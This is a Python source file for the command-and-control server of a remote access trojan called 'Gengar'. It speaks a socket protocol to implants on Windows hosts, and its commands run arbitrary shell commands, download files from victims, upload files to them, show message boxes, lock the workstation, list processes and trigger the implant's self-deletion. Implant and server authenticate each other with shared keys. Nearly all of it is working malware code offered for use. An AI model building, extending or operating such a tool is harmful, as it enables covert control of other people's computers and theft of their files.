import datetime
import os
import socket
import struct
from dataclasses import dataclass
from typing import Union

import auth_keys
import output
from auth_keys import AuthenticationKeys
from logger import logger


class CommandTypes:
    ECHO = 0
    SHELL = 1
    MSGBOX = 2
    SUICIDE = 3
    DOWNLOAD_FILE = 4
    UPLOAD_FILE = 5


INT_SIZE = 4
LONG_SIZE = 8


class GengarAuthenticationFailed(Exception):
    def __str__(self) -> str:
        return 'Failed to authenticate Gengar with the CNC.'


class GengarDisconnected(Exception):
    def __str__(self) -> str:
        return 'Gengar has disconnected from the CNC.'


@dataclass
class ShellOutput:
    exit_code: int
    output: Union[str, bytes]


@dataclass
class Gengar:
    _sock: socket.socket
    host: str
    _authenticated: bool = False
    alive: bool = True

    _AUTH_KEYS = auth_keys.get()
    _AUTH_TIMEOUT_SEC = 5

    _FILE_IO_CHUNK_SIZE = 8192

    def init(self):
        self.spawn_time = datetime.datetime.now()
        self.username = self.shell('echo %username%').output

    def _send(self, buf: bytes):
        if not self.alive:
            raise GengarDisconnected

        try:
            self._sock.sendall(buf)
        except ConnectionError:
            self.alive = False
            raise GengarDisconnected from None

    def _recv(self, bufsize: int):
        if not self.alive:
            raise GengarDisconnected

        try:
            return self._sock.recv(bufsize)
        except ConnectionError:
            self.alive = False
            raise GengarDisconnected from None

    def _recvall(self, bufsize: int):
        data = b''
        bytes_remaining = bufsize
        while bytes_remaining:
            data_chunk = self._recv(bytes_remaining)
            data += data_chunk
            bytes_remaining -= len(data_chunk)
        return data

    def echo(self, text: str):
        self._send(struct.pack('I', CommandTypes.ECHO) + struct.pack('I', len(text)) + text.encode())
        output = self._recvall(len(text)).decode()
        return output

    def shell(self, cmd: str):
        output = b''
        self._send(struct.pack('I', CommandTypes.SHELL) + struct.pack('I', len(cmd)) + cmd.encode())
        while True:
            output_size = struct.unpack('I', self._recvall(INT_SIZE))[0]
            if not output_size:
                exit_code = struct.unpack('i', self._recvall(INT_SIZE))[0]
                break
            output += self._recvall(output_size)

        try:
            return ShellOutput(exit_code, output.decode().strip())
        except UnicodeDecodeError:
            return ShellOutput(exit_code, output)

    def msgbox(self, title: str, text: str):
        self._send(struct.pack('I', CommandTypes.MSGBOX) + struct.pack('I', len(title)) +
                   title.encode() + struct.pack('I', len(text)) + text.encode())

    def download_file(self, remote_path: str, local_path: str = None):
        local_path = local_path or output.generate_path(remote_path)

        self._send(struct.pack('I', CommandTypes.DOWNLOAD_FILE) +
                   struct.pack('I', len(remote_path)) + remote_path.encode())
        return_code = struct.unpack('I', self._recvall(INT_SIZE))[0]
        if return_code != 0:
            logger.error(f'Failed to download file: {return_code}')
            return

        bytes_remaining = struct.unpack('Q', self._recvall(LONG_SIZE))[0]
        logger.info(f'Downloading {remote_path} ({bytes_remaining})')
        with open(local_path, 'wb') as output_file:
            while True:
                if not bytes_remaining:
                    break
                bytes_to_read = min(bytes_remaining, self._FILE_IO_CHUNK_SIZE)
                file_chunk = self._recvall(bytes_to_read)
                output_file.write(file_chunk)
                bytes_remaining -= bytes_to_read

    def upload_file(self, local_path: str, remote_path: str = None):
        self._send(struct.pack('I', CommandTypes.UPLOAD_FILE) +
                   struct.pack('I', len(remote_path)) + remote_path.encode())
        return_code = struct.unpack('I', self._recvall(INT_SIZE))[0]
        if return_code != 0:
            logger.error(f'Failed to download file: {return_code}')
            return

        file_size = os.path.getsize(local_path)
        self._send(struct.pack('Q', file_size))
        logger.info(f'Uploading {local_path} ({file_size})')
        with open(local_path, 'rb') as output_file:
            while True:
                file_chunk = output_file.read(self._FILE_IO_CHUNK_SIZE)
                if not file_chunk:
                    break
                self._send(file_chunk)

    def suicide(self):
        self._send(struct.pack('I', CommandTypes.SUICIDE))
        self._sock.close()
        self.alive = False

    def lock_workstation(self):
        self.shell('rundll32.exe user32.dll,LockWorkStation')

    def process_list(self):
        return self.shell('tasklist').output

    def auth(self):
        if self._authenticated:
            logger.info('Gengar already authenticated.')
            return

        try:
            self._sock.settimeout(self._AUTH_TIMEOUT_SEC)
            received_gengar_key = self._recvall(AuthenticationKeys.KEY_LEN)
            if received_gengar_key != self._AUTH_KEYS.gengar:
                raise GengarAuthenticationFailed
            self._send(self._AUTH_KEYS.cnc)
            self._authenticated = True
        except socket.timeout:
            raise GengarAuthenticationFailed
        finally:
            self._sock.settimeout(None)

    @property
    def uptime(self):
        return datetime.datetime.now() - self.spawn_time

    def __repr__(self) -> str:
        return f'Gengar @ {self.username} # {self.uptime}'
